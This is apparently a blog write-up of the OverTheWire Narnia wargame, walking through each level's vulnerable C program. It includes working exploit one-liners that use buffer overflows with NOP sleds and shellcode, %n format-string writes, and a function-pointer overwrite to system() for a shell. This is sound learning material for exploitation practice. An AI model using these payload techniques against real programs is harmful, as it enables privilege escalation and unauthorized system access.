---
layout: post
title: OverTheWire Narnia Writeup
date: 2025-08-02
tags: writeup overthewire
---

After an almost year-long hiatus, I've come back to this site to work on the next CTF game. This post contains my writeup to all the levels, complete with my thinking process and context.

Narnia helped me learn and understand more about how code works at a binary level, especially with how I could use vulnerabilities in machine code and C code/functions in order to gain higher access, and how I could prevent these issues from happening in my own code.

Previously, my only experience in binary (exploitation) came through computer architecture classes that I took during college, however they mostly dealt with MIPS assembly instead of x86, and relied on illustrations & diagrams. They somewhat helped me with solving these problems, but for the most part, I had to spend the majority of my time researching on my own (and with guidance from some people @ OTW). Nevertheless, it's been a blast solving all of these levels.

### Introduction

As usual, we will be using the SSH command  `ssh narnia[LVL]@narnia.labs.overthewire.org -p 2226` for this wargame. There won't be anything on the home folders, instead everything we need to access is in the `/narnia/` directory, which includes all the executables and source code. Assume that we are working on that directory.

All passwords will be located on `/etc/narnia_pass/narnia[LVL]`. Each level/user only has access to their own password file, but the executables have an SUID bit that will let us run them as the next level, so we can get the passwords ourselves when we gain access to the shell.

### Level 0

To start this level, we can look at the source code on `narnia0.c`:

```c
...
int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }
    ...
```

There's a few things that I've noticed from this code:

1. The scanf function parses the first 24 characters of the input, but `buf` is only 20 bits in size.
2. We have to change `val` to hex 0xdeadbeef to access the shell as narnia1.
3. `val` doesn't get changed directly.

The only way we can change the value is by changing the buffer beyond the 20 bytes it's allocated towards. Since buffer is 20 bytes and the input allows us to write up to 24, we can write past the buffer in order to change the bytes allocated towards val. This is commonly known as a buffer overflow attack. You can see this for yourself by using an input with size 21, as the value changes to something other than 0x41414141.

![Graph of how we can visualize the buffer](/assets/posts/narnia_0_buffer.png)

We can do this by filling the first 20 letters with any random value, then filling the last 4 bytes with 0xdeadbeef. Note that because this is an x86 machine, bits are little-endian, so we have to reverse our byte order for those 4 bytes. This is as simple as separating it into 0xef, 0xbe, 0xad, then 0xde.

I wrote a C program that will simply print out the input for us. I placed it on `/tmp/` then compiled it as `/tmp/prog`. This is just one method on how we can print out the bytes, and I'll occasionally switch how I solve the levels.

```c
#include <stdio.h>
int main() {
    for (int i = 0; i < 5; i++) {
        printf("hell");
    }
    putchar(0xef);
    putchar(0xbe);
    putchar(0xad);
    putchar(0xde);

    return 0;
}
```

I ran this by running my program then piping it with narnia/narnia0. While this changed the value correctly, I found an issue where it exits immediatly before I could use the shell. I circumvented this by running cat alongside my compiled program. Something like `(/tmp/prog; cat) | /narnia/narnia0`.

Once you get an empty line, you are free to enter any command and get the password to the next level.

### Level 1

At `narnia1.c` we have this:

```c
...
int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();
    ...
```

The program reads an environment variable that we are supposed to save using the `export` command.

However I noticed that the EGG variable is directly setting the function `ret`. This means we have to give it some kind of code that will make it run on the program directly. Obviously, plaintext C code will not work.

I found out about something called shellcode, which is basically a just a set of assembly instructions that allow us to run arbritary code. There's a bunch of random shellcode samples from the internet, such as this [list from Shell-storm](https://shell-storm.org/shellcode/index.html), and the code that I've found working for this level is [this one](https://shell-storm.org/shellcode/files/shellcode-606.html), since it is for linux x86 systems and it will run the shell at the currect user ID. You can parse this as one line if you want to.

Once we set the variable with ``export EGG=`echo -e "\x6a\x0b\x58\..."` ``{:.language-bash .highlight}, we can run the program and get the shell as narnia2!

### Level 2

```c
...
int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);
    ...
```

This one seems similar with level 0, with a potential buffer overflow attack on the `buf` array. I know that the `strcpy()` function is prone to vulnerabilities as it will copy strings without checking sizes. We can input a string as large as we can, but if it is greater than 128 characters, it will still keep writing to `buf`. However, there's no ordinary variable after it that we can overwrite.

As a test, I ran the program with various string sizes. I have noticed that, with a string of 132 characters, the program segfaults.

![Segfault at 132 chars](/assets/posts/narnia_2_segfault.png)

From what I can understand about assembly, after we go past the `main()` variables (which are the 128 chars in the array), the 4 bytes after that hold some kind of frame pointer or padding (which aren't immediately or fully used, hence the program not crashing on 131 chars), and the 4 bytes right after hold the return address. The return address will be useful here because it'll tell the program where to jump in memory after executing main. So in total, we need to have 136 characters in our input argument.

However, before we get there, we need to figure out what our payload will be for the first 132 bytes. I decided to use the same shellcode from the previous level, which is 33 bytes. The rest of the space (99 bytes) will be placed on the front of the input, and it will consist of no-operation instructions (0x90 in hex). NOP will basically just skip to the next byte/instruction in assembly without doing anything. That way, we will have space to put our return address in, and it will allow the shellcode to run smoothly.

To find the last 4 bytes for our return memory address, we need to use a debug program like GDB and look at it's memory when the program crashes. I did this by running `gdb ./narnia `, then when the gdb prompt opens up, we can run the program using `` r `python3 -c "print (132*'q')"` ``{:.language-bash .highlight}. When the program crashes, we can see the memory past the stack pointer by doing `x/100xw $esp`.

You should keep pressing enter until you find the correct part of memory, which you can tell by seeing a blob of the same hex values (in particular, 0x71 as it is the hex code for the letter q). The address closest to the middle should be the return address, to give it a good enough range so we can re-run the program. I chose 0xffffd540. Just like in the first level, the characters will be in reverse order.

![The memory dump](/assets/posts/narnia_2_mem.png)

Now that we have all the parts needed, we can put it together in one line like so:

```bash
./narnia2 `python3 -c "import os; os.write(1, b'\x90'*99 + b'\x6a...\x80' + b'\x40\xd5\xff\xff')"`
```

### Level 3

```c
...
int main(int argc, char **argv){
    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]); exit(-1);}

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile); exit(-1); }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile); exit(-1); }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
    ...
```

In this level we have to manage files by giving it a file to read from `ifile`, which will then send it to the file `ofile`. Immediatly I can see that we can set both `ofile` and `ifile` by a buffer overflow, since the input relies on the `strcpy()` function, though both files need to be valid. The buffer array is not that important as it just copies the contents of the input file to it, but there is a size limit of 32 bytes (which isn't really important for us).

As a test, I ran the program with various input sizes to see if the error messages change.

![Overflow test](/assets/posts/narnia_3_error.png)

At less than 32 characters, it will print out the input file it fails to access. At 32 or more, however, it will print out the failed output file, since it overwrites the `/dev/null` it was set to by default.

However, there is another caveat with doing a buffer overflow on two strings like this. Since strings in C are null-terminated (they end as soon as a 0x00 character is found), the actual filename put into `ifile` will keep going past `ofile`, including it in the end of it's string. So that means we have to somewhat share filenames with the two.

![How variables will look like](/assets/posts/narnia_3_files.png)

I decided to create a subdirectory on `/tmp/`, with a name that is 32 minus 5 characters long, because it's the best way we can create two files with the same name, which we can use for both the input file and output file.

In the subdirectory, I created another subdirectory called `tmp` so that it can be compatible with our output. In order to make our exploit work, I would need to create a symlink inside it that points to the actual narnia4 password file using `ln -s`. This will be our input file.

For our output file, we can create an empty file on `/tmp/` that is named the same as the input file.

With our two files ready, we can now run the executable, using the full directory path of the input file. This will then read the password of narnia4 and write it to the output file. Cat it and you've got your password.

### Level 4

```c
...
extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);
    ...
```

This is very similar to Level 2, in which we have a buffer that `strcpy()` writes to, and there isn't really anything meaningful happening in the program itself. Instead of 128 bytes, we have 260 bytes (256 chars + 1 int) to work with, which means the input in total would need to be 268 characters long.

The process to solving this is the exact same as Level 2, down to the same commands. You would just need to change the amount of NOP instructions to 231. You might not need to change the return address, as the doubling of space would make it easier to not segfault.

### Level 5

```c
int main(int argc, char **argv){
        int i = 1;
        char buffer[64];

        snprintf(buffer, sizeof buffer, argv[1]);
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
                printf("GOOD\n");
        setreuid(geteuid(),geteuid());
                system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);
        ...
```

The program wants us to change `i` to 500 in order to get into the shell. Unlike the previous levels, we cannot use buffer overflow here, because it uses `snprintf()` which takes account of the size of the buffer array, and the last character in our input is removed. This means that, no matter how big your imput is, it will only write the first 63 characters.

Another thing I noticed is that it gives you a hint if you get it wrong. It only prints our what you put in the buffer, the string length, and the value and memory address of `i`. I wasn't sure what to do with these values, but then I realized they were trying to hint us about the format strings themselves. Perhaps a potential format string vulnerability?

Since `snprintf` is a print function that support format strings, we can supply it with any format specifier that we would normally use in a print function in C. The vulnurability here comes from how it lets us provide the string directly from our input. You can test it yourself by adding something like `%p` in your input, and it'll provide a hex representation of whatever's in memory near the stack.

This will be tricky though since we can't directly give the parameters. Without them, it seems that format strings will just read directly from the next 4 bytes in the stack memory. Luckily for us, the `snprintf()` function handling it comes right after the `buffer` array, where our input gets placed. So in theory, we can set our parameters for our format strings, by setting 4+ characters at the front.

You can test this out by doing something like `./narnia5 "AAAABBBBCCCC %x %x %x"`. Doing this will print the hex representations of the 12 starting characters.

While this is useful for getting info out of the stack, what we want to do is write info, not read it. Funnily enough, the program already gives us the memory address of `i`, so we just need to write it down. In my case, it is 0xffffd390, but be warned that it may change occasionally.

I found a few things that could be useful:

- You can "pad" format specifiers by adding a number after the % symbol, which will give them a minimum length. For example, `%5d` will print an integer, but it will pad out the front with empty spaces if the number is less than 5 digits.
- There is actually at least one format specificer that WRITES to memory instead of reading it. `%n` does not print anything, but if given a pointer, it will write to it the length of the string that the print function has finished parsing so far. For some reason, it does not stop when it cannot write anymore.

Because of these, we can write the value of 500 to `i`. To do this we only need to use the specifiers `%d` (or anything that reads 4 bytes) and `%n`. The `%d` will help us use the padding format in order to get a string that is 500 characters, and the `%n` will write that length at the very end. The two of these will need 8 bytes at the start of the input, so the padding will be `%492d`.

As for the 8 bytes, the first 4 can just be any random junk value. The next 4 will be the memory address for `i` that we got previously, in little endian format of course.

Once we put that together, we can get our input string that's small enough to work.

```bash
./narnia5 `echo -e "test\x90\xd3\xff\xff%492d%n"`
```

### Level 6

```c
...
extern char **environ;

unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax");
}
int main(int argc, char *argv[]){
        char b1[8], b2[8];
        int  (*fp)(char *)=(int(*)(char *))&puts, i;

        if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

        /* clear environ */
        for(i=0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));
        /* clear argz    */
        for(i=3; argv[i] != NULL; i++)
                memset(argv[i], '\0', strlen(argv[i]));

        strcpy(b1,argv[1]);
        strcpy(b2,argv[2]);
        //if(((unsigned long)fp & 0xff000000) == 0xff000000)
        if(((unsigned long)fp & 0xff000000) == get_sp())
                exit(-1);
        setreuid(geteuid(),geteuid());
    fp(b1);
    ...
```

Breaking down the code, we can see:

1. The code wants 2 arguments, and uses `strcpy()` to put them into two 8-character arrays. This means we can buffer overflow here.
2. It clears environment variables and extra arguments, but I suspect this is only here to prevent unintended solutions or server attacks.
3. The program exits early if `fp` points to somewhere at the top of the stack. Since it runs without error, that means that it gets called to somewhere far below the memory.
4. `fp(b1)` is called. Apparantly it is used as a function pointer, and currently only runs `puts(b1)`, so it only prints the first argument.

We cannot use a shellcode attack like the ones we used in previous levels. This is because we have fewer bytes to store info on, and the program will not let us run code that is on stack memory.

At first glance, it seems that you cannot write over the function pointer `fp` because it is declared right after `b1` and `b2`, which mean that a buffer overflow wouldn't change it's value. However, it turns out that `fp` on the stack is actually right below `b1`, so we are able to overwrite it by overflowing that char array. I was able to confirm this by running this C code:

```c
#include <stdio.h>

int main(){
    char b1[8], b2[8];
    int  (*fp)(char *)=(int(*)(char *))&puts, i;

    printf("Addr b1: %p\n", (void *)b1);
    printf("Addr b2: %p\n", (void *)b2);
    printf("Addr fp: %p\n", (void *)&fp);
    printf("Addr i:  %p\n", (void *)&i);
}
```

Reading the addresses confirms that the stack memory goes like this, from lowest to highest: `i <- fp <- b1 <- b2`. I'm not sure why this is, but my guess is some kind of compiler optimization involving arrays.

Anyways, how are we supposed to replace `fp`? Since it's pointing to an existing function `puts()`, we can possibly try to replace it with another library function that could give us shell access, and with input that is 8 characters or smaller. Luckily, the program includes the `<stdlib.h>` library, which includes the `system()` function to run any command, including the shell.

We can use GDB to easily find the memory locations to standard library functions. We can do `gdb ./narnia6`, run the program (to load up the libraries), then use the print command to get the memory address of the function: `p system`. In my case, it was displayed in blue font as 0xf7dce450. As you can notice, it does not end in 0xff so it will not exit early.

Now that we have that, we need to overflow two arguments in order to run our exploit. The first one, which overflows `b1`, will be used to overwrite `fp` with the memory address of `system()` that we just obtained. The second argument will overflow `b2` to overwrite `b1` with `/bin/sh` to run the shell. Unfortunately we can't do this in one argument because of null character issues.

Since each buffer is only 8 bytes long, we just need an 8-letter word to overflow both with...

```bash
./narnia6 `echo -e "deadbeef\x50\xe4\xdc\xf7"` deadbeef/bin/sh
```

### Level 7

```c
...
int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
            fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```

Wow that's probably the longest code we've seen here so far.

This program will run `goodfunction()` and does nothing with our input, except placing it in an array with the `snprintf()` function. We need to instead be able to run `hackedfunction()`. It also outputs the memory addresses of both functions, as well as the address and value of `ptrf`, the function pointer being called.

![Our address and values for variables](narnia_7_test.png)

Previously we used `snprintf()` to run a format string attack in Level 5. We can use the same idea in order to change the value of `ptrf` to the memory address of the hacked function, so we will be able to run it. We already have its memory address at 0xffffd2c8, and the value to change it to is 0x804930f (134517519).

We can use the same method we discussed on level 5. However, I've had to refine my format string a few times in order to stop segfaults, and eventually I removed the junk values on the first 4 letters in order for it to work. So our final input looks something like `\xc8\xd2\xff\xff%134517515d%n`. I'm not entirely sure why this was necessary here, but not on level 5.

Intriguing how the two levels have somewhat unique solutions for writing to memory, despite being so similar. Format strings just get weirder and weirder.

### Level 8

```c
...
int i;

void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
                bok[i]=blah[i];

        printf("%s\n",bok);
}

int main(int argc, char **argv){
        if(argc > 1)
                func(argv[1]);
        else
        printf("%s argument\n", argv[0]);

        return 0;
}
```

The function `func()` will write to the `bok` array by traversing the entire string we provide in the argument. This means we can do a buffer overflow attack, possibly by supplying the shellcode we've used in previous levels and overwriting the return address.

However there is one caveat- if we overflow `bok`, it will overwrite the pointer `blah`, which will make the function copy from a random area in memory instead of our input. So we need a way to re-supply that memory address.

To do this, we need to examine the stack memory when `func()` is being called, and see the values of the two variables. I ran GDB with the executable, then set up a breakpoint near the end before the stack pointer goes back to main. This will pause the program when we run it so that we can examine it in-place.

Run `disass func` to visualize the assembly code, then `b *func+<NUM>` to set the breakpoint. I set it to 110.

![GDB breakpoint](/assets/posts/narnia_8_bp.png)

With that set up, we can test the program with input of various length. Here's one that I ran with `r hello`, then got the memory by doing `x/16xw $esp`:

![Memory addresses](/assets/posts/narnia_8_mem.png)

I've highlighted above the values for our input that is held by `blah`. You can tell by the trail of zeroes that were memsetted beforehand. We do not need to worry about the 2nd value, but it can be useful for debugging. As you might notice, the value changes depending on how long our argument is, so we need to decrease it as we add more letters to it.

With 5 letters our value is 0xffffd577. With 20, we would have to decrease the last digits to 0x68. And if we want to actually set the pointer, it would then be 0x64. We can confirm this by checking the memory being written and if the two memory values match (refer to the previous image), as there's no valuable hints being shown by the print statement.

Here's some statments that worked for me:

```
r `echo -e "hellohellohellohello\x64\xd5\xff\xff"`
r `echo -e "hellohellohellohello\x60\xd5\xff\xffAAAA"`
r `echo -e "hellohellohellohello\x5c\xd5\xff\xffAAAABBBB"`
```

Now if we account that for the 33-byte shellcode, it would be ``r `echo -e "hellohellohellohello\x3b\xd5\xff\xffAAAABBBB"` ``

The `AAAA` here previously held our frame pointer, which isn't useful to us, so we can put any random value on it. The `BBBB` will be replaced by our own return address. Since we're providing the shellcode in our argument, we need to get the address that goes directly to it. Luckily, we have our pointer value right here, so we can just push it 32(0x20) letters forward. That would make our return address as 0xffffd55b.

And finally, we can append the entire shellcode to the back of our input. This isn't entirely safe because it relies on overwriting random memory values that the program might use, but I wouldn't care in this situation. Our command would then be ``r `echo -e "hellohellohellohello\x3b\xd5\xff\xffAAAA\x5b\xd5\xff\xff\x6a...\x80"` ``.

If we run it, we will be able to get the shell, however GDB is preventing us from accessing as the next user. We need to exit it and... damn. We need to re-calculate the memory values again. To do this we can use the `xxd` command to examine the values that get printed out if we overflow the buffer to 20 characters:

![Memory addresses without gdb](/assets/posts/narnia_8_xxd.png)

Great, we've got the address at 0xffffd581. Now we'd need to adjust it and the return address to the rest of our input size. You can do this part yourself :)

### Level 9

There's nothing to do here for now.

We've finished Narnia! Thanks for reading my writeup.
